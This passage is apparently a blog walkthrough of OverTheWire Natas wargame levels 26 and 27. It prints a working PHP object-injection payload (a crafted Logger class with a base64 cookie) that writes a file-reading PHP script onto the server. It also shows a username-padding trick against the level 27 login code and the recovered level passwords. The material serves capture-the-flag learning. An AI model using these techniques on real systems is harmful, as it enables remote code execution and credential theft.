</span><span class='line'>            <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;x2&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;y2&quot;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))){</span>
</span><span class='line'>        <span class="nv">$imgfile</span><span class="o">=</span><span class="s2">&quot;img/natas26_&quot;</span> <span class="o">.</span> <span class="nb">session_id</span><span class="p">()</span> <span class="o">.</span><span class="s2">&quot;.png&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="nx">drawImage</span><span class="p">(</span><span class="nv">$imgfile</span><span class="p">);</span>
</span><span class='line'>        <span class="nx">showImage</span><span class="p">(</span><span class="nv">$imgfile</span><span class="p">);</span>
</span><span class='line'>        <span class="nx">storeData</span><span class="p">();</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Code looks complicated so I&rsquo;m breaking it down in little pieces:</p>

<ul>
<li><p>We have a Logger class that writes some messages to a log file</p></li>
<li><p>the <em>showImage()</em> function sets the image tag source to the given filename, if that file exists</p></li>
<li><p>the <em>drawImage()</em> function creates an image and outputs it to the browser</p></li>
<li><p><em>drawFromUserdata()</em> uses the user-supplied coordinates to draw lines across the image</p></li>
<li><p><em>storeData()</em> populates an array with the 4 $_GET parameters and sets a cookie named <em>drawing</em> to contain the serialized and base64 encoded value of the previously created array</p></li>
</ul>


<p>So far, out of ideas, but when reading about <em>unserialize()</em> in the PHP manual, there was a security warning:</p>

<blockquote><p>Warning</p>

<p>Do not pass untrusted user input to unserialize(). Unserialization can result in code being loaded and executed due to object instantiation and
autoloading, and a malicious user may be able to exploit this. Use a safe, standard data interchange format such as JSON (via json_decode() and
json_encode()) if you need to pass serialized data to the user.</p></blockquote>

<p>Next I proceeded to read more about exploiting PHP unserialization, and there were quite a few resources available, so I must be on the right track :D And this also explained the existence of the Logger class, which isn&rsquo;t instantiated anywhere in the program. But first, we must understand what serialization is all about.</p>

<ul>
<li><p><em>string serialize ( mixed $value )</em></p></li>
<li><p>Generates a storable representation of a value. This is useful for storing or passing PHP values around without losing their type and structure. Returns a binary string containing a byte-stream representation of value that can be stored anywhere.</p></li>
</ul>


<p><strong>Serialization</strong> is the conversion of a PHP data structure to a string that can be passed to external applications, such as databases, or stored in files etc.</p>

<p><strong>Unserialization</strong> converts the string back to a PHP value</p>

<p>Now let&rsquo;s look at what OWASP says about the PHP object injection attack:</p>

<blockquote><p>The vulnerability occurs when user-supplied input is not properly sanitized before being passed to the unserialize() PHP function. Since PHP
allows object serialization, attackers could pass ad-hoc serialized strings to a vulnerable unserialize() call, resulting in an arbitrary PHP
object(s) injection into the application scope.</p>

<p>In order to successfully exploit a PHP Object Injection vulnerability two conditions must be met:</p>

<p>The application must have a class which implements a PHP magic method (such as <strong>wakeup or </strong>destruct) that can be used to carry out malicious
attacks, or to start a &ldquo;POP chain&rdquo;.</p>

<p>All of the classes used during the attack must be declared when the vulnerable unserialize() is being called, otherwise object autoloading must be
supported for such classes.</p></blockquote>

<p>Well, we can exploit this because both conditions apply to our case! Remember that we have the Logger class,  and it contains a <em>__construct()</em> and <em>__destruct()</em> magic method. So the class wasn&rsquo;t just lying around for nothing in the code, hehehe!</p>

<p>Before continuing, I want to show an <a href="http://www.w3resource.com/php/function-reference/serialize.php">example of serialization</a>, so you can have an idea of what it looks like with an easier to understand example than deciphering the <em>drawing</em> cookie:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="nv">$serialized_data</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;Math&#39;</span><span class="p">,</span> <span class="s1">&#39;Language&#39;</span><span class="p">,</span> <span class="s1">&#39;Science&#39;</span><span class="p">));</span>
</span><span class='line'><span class="k">echo</span>  <span class="nv">$serialized_data</span> <span class="o">.</span> <span class="s1">&#39;&lt;br&gt;&#39;</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x">  </span>
</span></code></pre></td></tr></table></div></figure>


<p>And the output is <code>a:3:{i:0;s:4:&ldquo;Math&rdquo;;i:1;s:8:&ldquo;Language&rdquo;;i:2;s:7:&ldquo;Science&rdquo;;}</code>. Ugh, looks complicated! But here it is:</p>

<ul>
<li><p>a = array, 3 = the number of elements in the array</p></li>
<li><p>i = integer, 0 = index in the array, s = string, 4 = length of the string, Math is the element value, and this continues for the other elements as well</p></li>
</ul>


<p>Now, to exploit this. We have:</p>

<ul>
<li><p>a way to inject our own code into the application (by changing the <em>drawing</em> cookie that will get unserialized)</p></li>
<li><p>a way to write to a file (leverage the Logger class)</p></li>
<li><p>a way to read a file (we can browse to where images are stored inside <em>img/</em>)</p></li>
</ul>


<p>First, I made my own malicious Logger class:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="k">class</span> <span class="nc">Logger</span><span class="p">{</span>
</span><span class='line'>        <span class="k">private</span> <span class="nv">$logFile</span><span class="p">;</span>
</span><span class='line'>        <span class="k">private</span> <span class="nv">$initMsg</span><span class="p">;</span>
</span><span class='line'>        <span class="k">private</span> <span class="nv">$exitMsg</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">function</span> <span class="nf">__construct</span><span class="p">(){</span>
</span><span class='line'>            <span class="c1">// initialise variables</span>
</span><span class='line'>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">initMsg</span><span class="o">=</span><span class="s2">&quot;pwn&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exitMsg</span><span class="o">=</span> <span class="s2">&quot;&lt;?php echo readfile(&#39;/etc/natas_webpass/natas27&#39;);?&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span> <span class="o">=</span> <span class="s2">&quot;img/pass.php&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">function</span> <span class="nf">__destruct</span><span class="p">(){</span>
</span><span class='line'>            <span class="c1">// write exit message</span>
</span><span class='line'>            <span class="nv">$fd</span><span class="o">=</span><span class="nb">fopen</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">logFile</span><span class="p">,</span><span class="s2">&quot;a+&quot;</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fd</span><span class="p">,</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">exitMsg</span><span class="p">);</span>
</span><span class='line'>            <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fd</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="nv">$myobj</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Logger</span><span class="p">();</span>
</span><span class='line'><span class="k">echo</span> <span class="nb">base64_encode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$myobj</span><span class="p">));</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>This code I wrote and tested on my local machine, first with local files, to see that it behaves as I want it to. When that was done, I used PHP to serialize and base64 encode it, so I can paste it in the cookie, and this is how it looks like:</p>

<ul>
<li>serialized:</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>O:6:"Logger":3:{s:15:"LoggerlogFile";s:12:"img/pass.php";s:15:"LoggerinitMsg";s:3:"pwn";s:15:"LoggerexitMsg";s:52:"&lt;?php echo readfile('/etc/natas_webpass/natas27');?&gt;";}</span></code></pre></td></tr></table></div></figure>


<ul>
<li>base64 encoded:</li>
</ul>


<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czoxMjoiaW1nL3Bhc3MucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MzoicHduIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NTI6Ijw/cGhwIGVjaG8gcmVhZGZpbGUoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7Pz4iO30=</span></code></pre></td></tr></table></div></figure>


<p>In my Logger class I just removed what wasn&rsquo;t necessary from the original code, and made the modifications so that the script will create a PHP file inside the <em>img/</em> directory, with this code inside it:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">echo</span> <span class="nb">readfile</span><span class="p">(</span><span class="s1">&#39;/etc/natas_webpass/natas27&#39;</span><span class="p">);</span><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>And after changing the cookie and navigating to pass.php, the code gets executed and spits the password: <code>55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ</code></p>

<p>Because I used <em>readfile()</em>, I actually saw the password followed by a space and 33 (the length of read data). I looked in the PHP manual and noticed saw that <em>file_get_contents()</em> is a better choice for reading a file into a string, but I was too lazy to change it!</p>

<blockquote><p>file_get_contents() is the preferred way to read the contents of a file into a string.</p></blockquote>

<p>Helpful resources:</p>

<p><a href="https://stackoverflow.com/questions/8641889/how-to-use-php-serialize-and-unserialize">PHP serialization</a></p>

<p><a href="https://www.owasp.org/index.php/PHP_Object_Injection">OWASP PHP Object Injection</a></p>

<p><a href="https://www.notsosecure.com/2015/09/24/remote-code-execution-via-php-unserialize/">RCE with PHP unserialize</a></p>

<p><a href="https://vagosec.org/2013/09/wordpress-php-object-injection/">PHP object injection</a></p>

<p><a href="https://www.owasp.org/images/9/9e/Utilizing-Code-Reuse-Or-Return-Oriented-Programming-In-PHP-Application-Exploits.pdf">unserialize() exploitation</a></p>

<h3>Level 27</h3>

<p><img class="center" src="/images/overthewire/natas/natas14.png" title="natas27" alt="natas 27"></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// morla / 10111</span>
</span><span class='line'><span class="c1">// database gets cleared every 5 min</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="cm">/*</span>
</span><span class='line'><span class="cm">CREATE TABLE `users` (</span>
</span><span class='line'><span class="cm">  `username` varchar(64) DEFAULT NULL,</span>
</span><span class='line'><span class="cm">  `password` varchar(64) DEFAULT NULL</span>
</span><span class='line'><span class="cm">);</span>
</span><span class='line'><span class="cm">*/</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">checkCredentials</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$usr</span><span class="p">,</span><span class="nv">$pass</span><span class="p">){</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$user</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$usr</span><span class="p">);</span>
</span><span class='line'>    <span class="nv">$password</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$pass</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT username from users where username=&#39;</span><span class="si">$user</span><span class="s2">&#39; and password=&#39;</span><span class="si">$password</span><span class="s2">&#39; &quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
</span><span class='line'>        <span class="k">return</span> <span class="k">True</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="k">False</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">validUser</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$usr</span><span class="p">){</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$user</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$usr</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * from users where username=&#39;</span><span class="si">$user</span><span class="s2">&#39;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">return</span> <span class="k">True</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="k">False</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">dumpData</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$usr</span><span class="p">){</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$user</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$usr</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;SELECT * from users where username=&#39;</span><span class="si">$user</span><span class="s2">&#39;&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nb">mysql_num_rows</span><span class="p">(</span><span class="nv">$res</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_assoc</span><span class="p">(</span><span class="nv">$res</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>                <span class="c1">//thanks to Gobo for reporting this bug!</span>
</span><span class='line'>                <span class="c1">//return print_r($row);</span>
</span><span class='line'>                <span class="k">return</span> <span class="nb">print_r</span><span class="p">(</span><span class="nv">$row</span><span class="p">,</span><span class="k">true</span><span class="p">);</span>
</span><span class='line'>            <span class="p">}</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="k">False</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">function</span> <span class="nf">createUser</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span> <span class="nv">$usr</span><span class="p">,</span> <span class="nv">$pass</span><span class="p">){</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$user</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$usr</span><span class="p">);</span>
</span><span class='line'>    <span class="nv">$password</span><span class="o">=</span><span class="nb">mysql_real_escape_string</span><span class="p">(</span><span class="nv">$pass</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>    <span class="nv">$query</span> <span class="o">=</span> <span class="s2">&quot;INSERT INTO users (username,password) values (&#39;</span><span class="si">$user</span><span class="s2">&#39;,&#39;</span><span class="si">$password</span><span class="s2">&#39;)&quot;</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$res</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nb">mysql_affected_rows</span><span class="p">()</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
</span><span class='line'>        <span class="k">return</span> <span class="k">True</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">return</span> <span class="k">False</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;username&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">)</span> <span class="k">and</span> <span class="nb">array_key_exists</span><span class="p">(</span><span class="s2">&quot;password&quot;</span><span class="p">,</span> <span class="nv">$_REQUEST</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>    <span class="nv">$link</span> <span class="o">=</span> <span class="nb">mysql_connect</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;natas27&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;censored&gt;&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="nb">mysql_select_db</span><span class="p">(</span><span class="s1">&#39;natas27&#39;</span><span class="p">,</span> <span class="nv">$link</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>    <span class="k">if</span><span class="p">(</span><span class="nx">validUser</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">//user exists, check creds</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nx">checkCredentials</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">],</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;password&quot;</span><span class="p">])){</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;Welcome &quot;</span> <span class="o">.</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;!&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;Here is your data:&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>            <span class="nv">$data</span><span class="o">=</span><span class="nx">dumpData</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">]);</span>
</span><span class='line'>            <span class="k">print</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$data</span><span class="p">);</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">else</span><span class="p">{</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;Wrong password for user: &quot;</span> <span class="o">.</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">//user doesn&#39;t exist</span>
</span><span class='line'>        <span class="k">if</span><span class="p">(</span><span class="nx">createUser</span><span class="p">(</span><span class="nv">$link</span><span class="p">,</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">],</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;password&quot;</span><span class="p">])){</span>
</span><span class='line'>            <span class="k">echo</span> <span class="s2">&quot;User &quot;</span> <span class="o">.</span> <span class="nb">htmlentities</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="s2">&quot;username&quot;</span><span class="p">])</span> <span class="o">.</span> <span class="s2">&quot; was created!&quot;</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>    <span class="nb">mysql_close</span><span class="p">(</span><span class="nv">$link</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure>


<p>Before digging in the code, I just tested the functionality of the login system..you can create a user and then view its username and password values. After logging in, you will see something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> Welcome haxor!
</span><span class='line'>Here is your data:
</span><span class='line'>Array ( [username] =&gt; haxor [password] =&gt; doge ) </span></code></pre></td></tr></table></div></figure>


<p>I then tried to create a natas28 user to see what would happen&hellip;and surprise!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Wrong password for user: natas28</span></code></pre></td></tr></table></div></figure>


<p>This tells us that there is indeed such a user in the database and that our random password doesn&rsquo;t match the one stored in the database..so that&rsquo;s what we want to get! I&rsquo;ve tried some SQLi, but got nothing. So back to reading PHP code it is! (ugh)</p>

<ul>
<li><p><em>checkCredentials()</em> checks if the provided username and password (which are both escaped) exist in the table, returning True if they are</p></li>
<li><p><em>validUser()</em> checks if the username is already in the table</p></li>
<li><p><em>dumpData()</em> prints the data about the array containing the username and password as seen above in the log in message</p></li>
<li><p><em>createUser()</em> inserts a new username-password pair in the table</p></li>
</ul>


<p>The important part of the rest of the code is that it looks up the username in the table, creating it if it doesn&rsquo;t exist, and proceeding with the credentials check and data printing if it already exists. After reading about the functions in the PHP manual I still had no idea how to continue. At this point, noticing the flow of the code was helpful:</p>

<p>1) when giving a username that already exists, it continues to the credentials checking part</p>

<p>2) if credential check is successful, the welcome message and credentials data are printed (without any other action from the user)</p>

<p>Judging from the above lines of reasoning, I thought that the interesting function that I might need to check again is the <em>dumpData()</em> one (because it returns data from the database, so it&rsquo;s possible to find out about the natas18 user from it). Still no idea how to do that though, but another thing I noticed is how important the username is for the code: all the checks and actions revolve around it, and it was also possible to determine the existence of the natas18 user because of that. So, at this point, I thought the next part should be to convince the code to dump the data for natas18.</p>

<p>I next thought about creating a username of natas18 followed by many spaces, exceeding the 64 character limit. The code still returned wrong password, so all the spaces must be trimmed. I made a string in Python to check what really happens:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="n">user</span> <span class="o">=</span> <span class="s">&#39;natas28&#39;</span> <span class="o">+</span> <span class="s">&#39; &#39;</span> <span class="o">*</span> <span class="mi">64</span> <span class="o">+</span> <span class="s">&#39;end&#39;</span>
</span><span class='line'><span class="k">print</span> <span class="n">user</span>
</span><span class='line'><span class="s">&#39;natas28                                                                end&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>And I stopped inputting a password, because the code created users irrespective if they had passwords, and I could log in as an existing user with a blank password, as can be seen from this test dummy:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome yo!
</span><span class='line'>Here is your data:
</span><span class='line'>Array ( [username] =&gt; yo [password] =&gt; ) </span></code></pre></td></tr></table></div></figure>


<p>Now I tried to create a user with that long string and yeah, the space is removed:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>User natas28 end was created!</span></code></pre></td></tr></table></div></figure>


<p>However, when next I tried to log in just as natas28 with no password, here is what awaited me!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome natas28!
</span><span class='line'>Here is your data:
</span><span class='line'>Array ( [username] =&gt; natas28 [password] =&gt; JWwR438wkgTsNKBbcJoowyysdM82YjeF ) </span></code></pre></td></tr></table></div></figure>


